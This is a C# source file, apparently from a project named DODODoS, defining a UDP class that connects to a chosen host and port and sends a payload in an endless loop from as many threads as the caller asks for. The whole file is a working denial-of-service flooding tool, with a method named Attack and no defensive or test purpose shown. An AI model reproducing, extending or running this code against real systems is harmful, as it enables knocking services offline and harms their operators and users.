﻿using System;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;

namespace DODODoS
{
    public class UDP
    {
        UdpClient client;
        List<Thread> workers = new List<Thread>();
        bool isRunning;
        public bool IsRunning
        {
            get { return isRunning; }
        }
        public UDP()
        {
            client = new UdpClient();
        }

        public bool Connect(string host, int port)
        {
            try
            {
                client.Connect(host, port);
                return true;
            }
            catch (SocketException e)
            {
                return false;
            }
        }

        public bool Attack(byte[] message, int thread)
        {
            //      Simple recursive method. If the thread variable is set to 1 then it starts the attack, Otherwise it runs as much threads as indicated in the thread var
            if (thread == 1)
                while (true)
                    try
                    {
                        client.Client.Send(message);
                    }
                    catch (SocketException e)
                    {
                        return false;
                    }
            else
                for (int i = 0; i < thread; i++)
                {
                    Thread tmp = new Thread(() => Attack(message, 1));
                    tmp.Start();
                    workers.Add(tmp);
                    isRunning = true;
                }
            return true;
        }

        public void Stop()
        {
            foreach (Thread worker in workers)
                worker.Abort();
            isRunning = false;
        }
    }
}
